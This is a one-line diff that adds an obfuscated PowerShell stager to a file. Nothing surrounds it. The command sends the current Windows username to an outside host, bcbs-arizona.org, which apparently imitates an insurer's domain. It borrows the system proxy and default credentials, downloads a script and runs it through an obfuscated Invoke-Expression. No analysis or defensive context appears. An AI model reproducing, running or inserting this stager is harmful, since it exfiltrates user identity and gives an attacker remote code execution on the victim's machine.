@@ -1,0 +1,1 @@
+﻿$x=$Env:username;$u="http://www.bcbs-arizona.org/s2.txt?u=" + $x;$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=neW`-`ObjEct net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;$s=$w.DownloadString($u);iNVoKE-`e`Xp`R`eSSIon -Command $s;
